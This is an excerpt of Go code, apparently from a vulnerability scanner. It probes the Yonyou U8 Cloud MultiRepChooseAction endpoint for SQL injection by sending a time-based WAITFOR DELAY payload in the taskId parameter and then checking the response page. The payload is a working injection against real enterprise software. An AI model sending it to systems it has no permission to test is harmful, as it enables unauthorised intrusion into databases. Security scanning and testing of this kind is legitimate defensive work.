...
func MultiRepChooseActionScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	Portalreadfile := "用友 U8 Cloud MultiRepChooseAction SQL注入漏洞"
	urls := address + "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:1%27--"
	...
	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "选择报表") {
